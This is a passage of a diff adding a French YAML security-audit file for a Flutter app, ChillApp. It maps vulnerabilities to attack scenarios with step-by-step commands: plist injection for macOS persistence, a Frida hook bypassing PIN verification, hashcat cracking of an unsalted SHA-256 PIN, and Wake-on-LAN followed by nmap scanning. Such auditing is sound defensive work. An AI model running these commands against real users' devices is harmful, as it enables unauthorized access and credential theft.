+        command: "cat ~/Library/LaunchAgents/com.chill.app.plist"
+        tool: "cat"
+        result: "Fichier plist avec le chemin executable en clair"
+        detection_risk: "basse"
+      - step: 2
+        action: "Modifier le plist pour injecter des commandes"
+        command: "# Modifier la balise <string>exePath</string> pour inclure un programme malveillant"
+        tool: "editeur de texte"
+        result: "Le plist execute le programme malveillant au login"
+        detection_risk: "basse"
+    impact: "Persistance sur macOS. Execution de code a chaque login via le LaunchAgent."
+    severity: MOYENNE
+    cvss: 5.5
+    evidence:
+      file: "lib/features/settings/settings_provider.dart"
+      line: 116
+      code: "'    <string>$exePath</string>\\n'"
+      issue: "$exePath interpole sans echappement XML. Le fichier plist est modifiable par l'utilisateur."
+    estimated_time: "5 minutes"
+    tools_required: ["editeur de texte", "acces filesystem"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Plist modifie dans ~/Library/LaunchAgents/"
+
+  # ============================================
+  # BASSES (exploitables, utiles dans les chaines)
+  # ============================================
+
+  - id: ATK-016
+    vuln_refs: ["VULN-016"]
+    category: FLT
+    title: "Instrumentation Frida pour contourner le PIN et extraire la memoire"
+    attacker_profile: "Hacker competent avec acces local"
+    attacker_skill_level: "competent"
+    attacker_position: "local"
+    preconditions:
+      - "Frida installe sur la machine"
+      - "Processus ChillApp en cours d'execution"
+    attack_steps:
+      - step: 1
+        action: "Attacher Frida au processus ChillApp"
+        command: "frida -p $(pgrep chill_app) -l bypass_pin.js"
+        tool: "Frida"
+        result: "Frida attache au processus — aucune detection anti-debug"
+        detection_risk: "basse"
+      - step: 2
+        action: "Hooker la methode verifyPin pour toujours retourner true"
+        command: "# bypass_pin.js: Interceptor.replace(verifyPin_addr, new NativeCallback(function() { return 1; }, 'int', []));"
+        tool: "Frida"
+        result: "La verification du PIN est contournee — tout PIN est accepte"
+        detection_risk: "basse"
+    impact: "Contournement du PIN sans le connaitre. Pas de detection anti-debug ni anti-Frida."
+    severity: BASSE
+    cvss: 3.1
+    evidence:
+      file: "lib/main.dart"
+      line: 1
+      code: "void main() async {"
+      issue: "Aucune detection de debugger ou d'instrumentation dynamique."
+    estimated_time: "30 minutes"
+    tools_required: ["Frida"]
+    detection_difficulty: "difficile"
+    indicators_of_compromise:
+      - "Frida server en cours d'execution"
+      - "Bibliotheques injectees dans le processus"
+
+  - id: ATK-017
+    vuln_refs: ["VULN-017"]
+    category: CRY
+    title: "Craquage instantane du hash PIN legacy SHA-256 sans sel"
+    attacker_profile: "Attaquant ayant extrait le hash PIN depuis SharedPreferences"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "local"
+    preconditions:
+      - "L'utilisateur n'a pas re-entre son PIN depuis la migration vers PBKDF2"
+      - "Le hash est encore au format legacy SHA-256 sans sel"
+    attack_steps:
+      - step: 1
+        action: "Verifier le format du hash (pas de sel = format legacy)"
+        command: "cat shared_preferences.json | python3 -c \"import json,sys; d=json.load(sys.stdin); print('LEGACY' if d.get('pin_salt') is None else 'PBKDF2')\""
+        tool: "python3"
+        result: "Format LEGACY confirme (pas de sel)"
+        detection_risk: "basse"
+      - step: 2
+        action: "Craquer le hash avec rainbow tables ou brute force rapide"
+        command: "hashcat -m 1400 -a 3 $HASH '?d?d?d?d?d?d?d?d'"
+        tool: "hashcat"
+        result: "PIN cracke en secondes (SHA-256 sans sel, 10^8 combinaisons max)"
+        detection_risk: "basse"
+    impact: "PIN cracke instantanement pour les utilisateurs avec le format legacy. SHA-256 sans sel = rainbow tables directement applicables."
+    severity: BASSE
+    cvss: 3.7
+    evidence:
+      file: "lib/features/lock/lock_provider.dart"
+      line: 186
+      code: "final oldHash = sha256.convert(utf8.encode(pin)).toString();"
+      issue: "Format legacy sans sel. La migration vers PBKDF2 ne s'effectue que lorsque l'utilisateur entre le bon PIN."
+    estimated_time: "1 minute"
+    tools_required: ["hashcat", "acces SharedPreferences"]
+    detection_difficulty: "invisible"
+    indicators_of_compromise:
+      - "Aucun — le craquage est hors-ligne"
+
+  - id: ATK-018
+    vuln_refs: ["VULN-018"]
+    category: NET
+    title: "Reveil de machine via WoL pour augmenter la surface d'attaque"
+    attacker_profile: "Attaquant sur le meme LAN"
+    attacker_skill_level: "script_kiddie"
+    attacker_position: "same_network"
+    preconditions:
+      - "L'adresse MAC de la cible est connue (affichee dans l'interface et copiable)"
+      - "WoL est active sur la machine cible"
+      - "L'attaquant est sur le meme LAN"
+    attack_steps:
+      - step: 1
+        action: "Obtenir l'adresse MAC (depuis l'interface ou le reseau)"
+        command: "# L'adresse MAC est affichee dans l'interface ChillApp (wol_setup_provider.dart:228)"
+        tool: "interface ChillApp ou scan ARP"
+        result: "Adresse MAC de la cible"
+        detection_risk: "basse"
+      - step: 2
+        action: "Envoyer un magic packet WoL"
+        command: "wakeonlan AA:BB:CC:DD:EE:FF"
+        tool: "wakeonlan"
+        result: "La machine cible se reveille"
+        detection_risk: "basse"
+      - step: 3
+        action: "Exploiter les services actifs apres reveil"
+        command: "nmap -sV TARGET_IP"
+        tool: "nmap"
+        result: "Services SSH, SMB, RDP detectes sur la machine reveillee"
+        detection_risk: "moyenne"
+    impact: "La machine est reveillee a l'insu de l'utilisateur, exposant ses services reseau. Pattern identique a la technique Ryuk ransomware (wake -> connect -> execute)."
+    severity: BASSE
+    cvss: 3.1
+    evidence:
+      file: "lib/features/wol_setup/wol_setup_provider.dart"
+      line: 228
+      code: "macAddress: macResult.stdout.isNotEmpty ? macResult.stdout : null,"
+      issue: "MAC affichee dans l'interface. WoL n'a aucune authentification (limitation du protocole)."
+    estimated_time: "1 minute"
+    tools_required: ["wakeonlan", "meme LAN"]
+    detection_difficulty: "moderee"
+    indicators_of_compromise:
+      - "Machine allumee a des heures inhabituelles"
+      - "Magic packets detectes sur le reseau"
+
+# ============================================
+# NON EXPLOITABLES
+# ============================================
+
+not_exploitable:
+  - vuln_ref: "VULN-019"
+    reason: "Les ordinateurs quantiques capables de casser Curve25519 ou AES-256 n'existent pas encore. L'attaque 'harvest-now-decrypt-later' est theorique et ne produit aucun impact concret aujourd'hui."
+    conditions_for_exploitation: "Necessiterait un ordinateur quantique cryptographiquement pertinent (estimation >2035). Le trafic devrait etre capture et stocke pendant des annees en attendant."
+
+# ============================================
+# COUVERTURE ET VALIDATION
+# ============================================
+
+vuln_coverage:
+  total_vulns: 19
+  mapped_to_scenario: 18
+  not_exploitable: 1
+  # INVARIANT : 18 + 1 == 19 == P3.summary.total ✓
+
+  mapping:
+    VULN-001: ATK-001
+    VULN-002: ATK-002
+    VULN-003: ATK-003
+    VULN-004: ATK-004
+    VULN-005: ATK-005
+    VULN-006: ATK-006
+    VULN-007: ATK-007
+    VULN-008: ATK-008
+    VULN-009: ATK-009
+    VULN-010: ATK-010
+    VULN-011: ATK-011
+    VULN-012: ATK-012
+    VULN-013: ATK-013
+    VULN-014: ATK-014
+    VULN-015: ATK-015
+    VULN-016: ATK-016
+    VULN-017: ATK-017
+    VULN-018: ATK-018
+    VULN-019: "not_exploitable"
+
+summary:
+  total_scenarios: 18
+  by_severity:
+    CRITIQUE: 3
+    HAUTE: 7
+    MOYENNE: 5
+    BASSE: 3
+  by_category:
+    SUP: 1
+    STO: 3
+    FLT: 6
+    CRY: 2
+    NET: 3
+  attacker_profiles_used:
+    - "script_kiddie (6 scenarios)"
+    - "competent (10 scenarios)"
+    - "expert (2 scenarios)"
+  most_dangerous: "ATK-001 (supply chain daemon) — CVSS 9.3, difficile a detecter, impact maximal"
+  easiest: "ATK-002 (bypass PIN) — 5 minutes, script kiddie, aucun outil special"
+  most_automated: "ATK-010 (brute force PIN) — entierement scriptable"
